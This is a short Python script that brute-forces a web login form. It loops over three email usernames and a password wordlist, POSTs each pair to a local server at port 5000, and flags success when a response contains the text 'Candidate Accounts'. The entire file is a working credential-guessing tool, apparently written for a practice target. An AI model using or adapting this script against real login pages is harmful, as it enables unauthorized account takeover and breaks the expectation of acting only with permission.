import requests
import sys

target       = "http://127.0.0.1:5000"
usernames    = ['admin@gmail.com', 'user1@gmail.com', 'user2@gmail.com']
passwordfile = "passwordlist.txt" 
needle       = "Candidate Accounts"


for username in usernames:
    with open(passwordfile, "r") as passwordlist:
        for password in passwordlist:
            password = password.strip("\n").encode("latin-1")
            sys.stdout.write(f"[x] attempting user: pass -> {username}:{password.decode()}\r")
            sys.stdout.flush()
            r = requests.post(target, data={"email": username, "password": password})
            print(r.headers)
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write(f"[>>>] valid password {password.decode()} found for user: {username}")
                sys.exit()
        else:
            sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write(f"No password found for user: {username}\n\n")

